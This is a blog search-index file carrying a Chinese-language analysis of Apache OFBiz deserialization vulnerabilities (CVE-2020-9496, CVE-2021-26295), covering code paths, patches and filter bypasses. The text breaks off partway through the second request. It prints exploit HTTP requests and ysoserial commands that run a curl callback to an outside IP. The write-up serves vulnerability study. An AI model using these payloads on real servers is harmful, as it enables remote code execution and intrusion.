<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Cursory Analysis Of Apache OFBiz Vulnerability</title>
      <link href="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/"/>
      <url>/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:#000000;">Apache OFBiz（Open for Business Project）是一个非常强大的开源企业资源规划（ERP）和企业自动化软件。它提供了一整套业务应用程序组件，可以用于构建各种企业级的业务管理系统，包括但不限于客户关系管理（CRM）、供应链管理（SCM）、电子商务、财务管理、制造管理等多个业务领域。</font></p><p><font style="color:#000000;">由于其连续爆出多个由于权限问题所导致的漏洞，本文旨在分析部分相关漏洞，学习了解相关的漏洞成因及利用手法。Apache OFBiz具体的漏洞细节可以在其官网查看，</font><a href="https://ofbiz.apache.org/security.html">https://ofbiz.apache.org/security.html</a>。</p><h2 id="Pre-Auth"><a href="#Pre-Auth" class="headerlink" title="Pre Auth"></a>Pre Auth</h2><h3 id="CVE-2020-9496"><a href="#CVE-2020-9496" class="headerlink" title="CVE-2020-9496"></a>CVE-2020-9496</h3><p><font style="color:#000000;">Apache XML-RPC是Apache软件基金会下的一个开源项目，它为Java开发者提供了一个完整的XML-RPC实现框架，方便开发人员在Java环境中构建能够支持XML-RPC通信的客户端和服务器端应用程序。但在2010年前后，Apache XML-RPC基本上就不更新了，历史上出现过多个反序列化漏洞（如CVE-2016-5003、CVE-2019-17570），但都没有被修复。</font><strong><font style="color:#000000;">而Apache OFBiz由于使用了XML-RPC组件，因此导致了漏洞的存在。</font></strong></p><p><font style="color:#000000;">该漏洞的本质原因为Apache OFBiz使用了XML-RPC组件，从而导致其易受不安全反序列化的影响。漏洞入口点在&#x2F;webtools&#x2F;control&#x2F;xmlrpc，查看framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;web.xml，可以得知control路由由org.apache.ofbiz.webapp.control.ControlServlet进行处理。</font></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Main Control Servlet<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.ofbiz.webapp.control.ControlServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/control/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">跟进org.apache.ofbiz.webapp.control.ControlServlet#doGet方法，先获取RequestHandler。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734343393268-bd8387da-0da6-43b9-b68c-03a711afcb85.png"></p><p><font style="color:#000000;">接着尝试从ServletContext中获取一个名为_REQUEST_HANDLER_的属性，可以看到读取了framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml文件。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734343542744-5cd43174-f94e-43ea-bca0-af34c41f0848.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;xmlrpc&quot;</span> <span class="attr">track-serverhit</span>=<span class="string">&quot;false&quot;</span> <span class="attr">track-visit</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;xmlrpc&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">可以看到对于xmlrpc路由，其security的值为false，即无需鉴权即可访问，接着进行一系列请求处理后调用org.apache.ofbiz.webapp.control.RequestHandler#doRequest方法来处理请求。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344116974-6f8165fb-0f26-4dc1-87b4-bde9d21a3432.png"></p><p><font style="color:#000000;">接着从framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml文件获取控制器配置信息。然后匹配访问的路由。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344604373-0d66790a-a988-4d9a-aec1-1b5f46afc459.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344657244-cdc5862f-66a6-4018-b492-29e167aae188.png"></p><p><font style="color:#000000;">接着调用到org.apache.ofbiz.webapp.control.RequestHandler#runEvent方法，根据event的类型，在工厂类中获取对应的EventHandler并执行其invoke方法。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344797184-391c8d08-6c14-4d64-a712-650e19f42d20.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734358989249-dd7b23a0-2bb5-45b6-a7e4-537ec4f897c1.png"></p><p><font style="color:#000000;">xmlrpc路由对应的EventHandler是XmlRpcEventHandler类，跟进org.apache.ofbiz.webapp.event.XmlRpcEventHandler#invoke方法，当请求中缺乏echo参数时进入else语句，调用org.apache.ofbiz.webapp.event.XmlRpcEventHandler#execute方法。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359084239-f499944f-9769-42cf-b528-cccc49f17272.png"></p><p><font style="color:#000000;">在org.apache.ofbiz.webapp.event.XmlRpcEventHandler#execute方法中，传入获取的XML-RPC配置和创建的HttpStreamConnection对象，执行XML-RPC调用。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359495453-1a557511-5da2-448e-9639-ab80896af324.png"></p><p><font style="color:#000000;">跟进org.apache.ofbiz.webapp.event.XmlRpcEventHandler#getRequest方法，创建一个XmlRpcRequestParser对象，用于解析XML-RPC请求，使用SAXParsers#newXMLReader实例化一个新的XMLReader对象，接着利用XMLReader解析输入流中的XML数据。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359775777-30445024-4d78-4220-8f95-ff577bda34c8.png"></p><p><font style="color:#000000;">继续跟进XmlRpcRequestParser，此时对输入流中的XML进行解析，包括startElement方法、endElement方法等，在startElement方法中会调用父类org.apache.xmlrpc.parser.RecursiveTypeParserImpl的startElement方法。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734420782428-a19209f5-7670-4d37-a2a6-05fcf2f11975.png"></p><p>在<font style="color:#000000;">org.apache.xmlrpc.parser.RecursiveTypeParserImpl#startElement方法中，扫描XML的标签的时候会调用getParser方法获取对应标签的parser。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734361621727-87345e9c-6a2f-4d1d-87f5-379fd6302ac5.png"></p><p><font style="color:#000000;">当标签为serializable时会调用解析器SerializableParser，其父类是ByteArrayParser，先进行一次Base64解码，然后在SerializerParser#getResult方法中会触发反序列化。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362755803-f50f0527-bf51-4229-938c-afb80219f409.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362215394-a251a14e-e085-4669-af81-1ff3392e0bdd.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362467223-70d20ed6-caae-4a1b-8396-bef28a989fb2.png"></p><p><font style="color:#000000;">需要注意的是，XmlRpcRequestParser的对于XML的解析中，处理过程是按照methodCall，methodName，params，param的顺序遍历标签进行的，当扫描完4个必须提供的标签后，才会调用父类的startElement方法进行处理，而typeParser就是在父类中完成赋值的，随后通过不同的解析器进入不同的解析流程。</font></p><p><font style="color:#000000;">因此，最后default中的解析是从value节点内开始的，而直接传入searializable标签是不存在getResult方法触发的，这里利用struct标签进行一层嵌套。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363080490-be8e8158-3ee6-4eb9-80c9-5daa4b544c02.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363154733-7d9b70ea-2e0d-4db9-9f7a-46827640abf7.png"></p><p>漏洞利用数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/xmlrpc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">name</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">           </span><span class="template-variable">&#123;&#123;<span class="name">Base64_Payload</span>&#125;&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363405198-e9396643-7834-4ea4-9a77-2edb89417858.png"></p><p><font style="color:#000000;">官方第一次提交的修复补丁</font><a href="https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a"><font style="color:#000000;">https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a</font></a><font style="color:#000000;">，此次补丁的主要作用是为XML-RPC的接口进行鉴权。</font></p><p><font style="color:#000000;">但是这种修复方式治标不治本，攻击者依旧可以实现Post-Auth攻击，因此官方进行了二次补丁，此次增加了关键词</serializable>的检测。但是这样就安全了嘛？很明显，可以利用增加空格的方式来进行绕过，因此官方又进行了一次补丁</font><a href="https://github.com/apache/ofbiz-framework/commit/25293e4cf6f334a2ae33b3041acba45113dddce9"><font style="color:#000000;">https://github.com/apache/ofbiz-framework/commit/25293e4cf6f334a2ae33b3041acba45113dddce9</font></a><font style="color:#000000;">，通过检测&lt;&#x2F;serializable关键词来进行防御。</font></p><h3 id="CVE-2021-26295"><a href="#CVE-2021-26295" class="headerlink" title="CVE-2021-26295"></a><font style="color:rgb(0, 0, 0);">CVE-2021-26295</font></h3><p><font style="color:#000000;">在上文分析CVE-2020-9496时，在controller.xml文件中还存在另一个路由SOAPService，其鉴权也是缺失的。</font></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;SOAPService&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;soap&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">可以看到，SOAPService路由对应的event为soap，寻找对应的SOAP Event Handler。在org.apache.ofbiz.webapp.event.SOAPEventHandler#invoke方法中，会利用SoapSerializer#deserialize方法，将SOAP请求中的XML数据反序列化为Java对象。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">invoke</span><span class="params">(Event event, RequestMap requestMap, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> EventHandlerException &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">String</span> <span class="variable">serviceName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SOAPBody</span> <span class="variable">reqBody</span> <span class="operator">=</span> reqEnv.getBody();</span><br><span class="line">        validateSOAPBody(reqBody);</span><br><span class="line">        <span class="type">OMElement</span> <span class="variable">serviceElement</span> <span class="operator">=</span> reqBody.getFirstElement();</span><br><span class="line">        serviceName = serviceElement.getLocalName();</span><br><span class="line">        Map&lt;String, Object&gt; parameters = UtilGenerics.cast(SoapSerializer.deserialize(serviceElement.toString(), delegator));</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        sendError(response, e.getMessage(), serviceName);</span><br><span class="line">        Debug.logError(e, <span class="keyword">module</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在org.apache.ofbiz.service.engine.SoapSerializer#deserialize方法中，会利用XmlSerializer#deserialize方法来将XML数据反序列化为Java对象。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String content, Delegator delegator)</span> <span class="keyword">throws</span> SerializeException, SAXException, ParserConfigurationException, IOException &#123;</span><br><span class="line">    <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> UtilXml.readXmlDocument(content, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (document != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> XmlSerializer.deserialize(document, delegator);</span><br><span class="line">    &#125;</span><br><span class="line">    Debug.logWarning(<span class="string">&quot;Serialized document came back null&quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在org.apache.ofbiz.entity.serialize.XmlSerializer#deserialize方法中，调用org.apache.ofbiz.entity.serialize.XmlSerializer#deserializeSingle方法，根据标签进行解析，接着进一步调用org.apache.ofbiz.entity.serialize.XmlSerializer#</font><font style="color:#000000;background-color:#ffffff;">deserializeCustom</font><font style="color:#000000;">方法。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(Document document, Delegator delegator)</span> <span class="keyword">throws</span> SerializeException &#123;</span><br><span class="line">    <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> document.getDocumentElement();</span><br><span class="line">    <span class="comment">// find the first element below the root element, that should be the object</span></span><br><span class="line">    <span class="type">Node</span> <span class="variable">curChild</span> <span class="operator">=</span> rootElement.getFirstChild();</span><br><span class="line">    <span class="keyword">while</span> (curChild != <span class="literal">null</span> &amp;&amp; curChild.getNodeType() != Node.ELEMENT_NODE) &#123;</span><br><span class="line">        curChild = curChild.getNextSibling();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (curChild == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserializeSingle((Element) curChild, delegator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeSingle</span><span class="params">(Element element, Delegator delegator)</span> <span class="keyword">throws</span> SerializeException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">tagName</span> <span class="operator">=</span> element.getLocalName();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;null&quot;</span>.equals(tagName)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deserializeCustom(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeCustom</span><span class="params">(Element element)</span> <span class="keyword">throws</span> SerializeException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">tagName</span> <span class="operator">=</span> element.getLocalName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;cus-obj&quot;</span>.equals(tagName)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> UtilXml.elementValue(element);</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">byte</span>[] valueBytes = StringUtil.fromHexString(value);</span><br><span class="line">            <span class="keyword">if</span> (valueBytes != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> UtilObject.getObject(valueBytes);</span><br><span class="line">                <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> obj;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializeException</span>(<span class="string">&quot;Problem deserializing object from byte array + &quot;</span> + element.getLocalName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializeException</span>(<span class="string">&quot;Cannot deserialize element named &quot;</span> + element.getLocalName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<font style="color:#000000;">XmlSerializer#</font><font style="color:#000000;background-color:#ffffff;">deserializeCustom</font><font style="color:#000000;">方法中，当标签为cus-obj时，对内容进行一次十六进制解码处理，然后调用org.apache.ofbiz.base.util.UtilObject#getObject方法将字节数组反序列化为Java对象。UtilObject#getObject方法进一步调用UtilObject#getObjectException方法来反序列化字节数组数据，但是这里调用的是自定义的SafeObjectInputStream来处理数据。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = getObjectException(bytes);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException e) &#123;</span><br><span class="line">        Debug.logError(e, <span class="keyword">module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObjectException</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">SafeObjectInputStream</span> <span class="variable">wois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SafeObjectInputStream</span>(bis)) &#123;</span><br><span class="line">        <span class="keyword">return</span> wois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">跟进SafeObjectInputStream，可以看到采用了白名单来限制了反序列化的类，由于java..*的松散程度过大，导致了恶意反序列化的发生。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734423006307-ef7649a9-4ed2-4507-83d7-8268c694fca9.png"></p><p><font style="color:#000000;">在官方补丁</font><a href="https://github.com/apache/ofbiz-framework/commit/af9ed4e">https://github.com/apache/ofbiz-framework/commit/af9ed4e</a><font style="color:#000000;">也可以看到，增加了对</font><font style="color:#000000;background-color:#ffffff;">java.rmi.server的反序列化限制。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734423244554-ec57d8c5-7cb8-4885-9119-174aae0b1400.png"></p><p>漏洞利用数据包如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 <span class="string">&quot;curl http://192.168.0.115:4444&quot;</span></span><br><span class="line">java -jar ysoserial-all.jar JRMPClient <span class="string">&quot;192.168.0.115:1099&quot;</span> | xxd -p -c 10000000</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/SOAPService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) 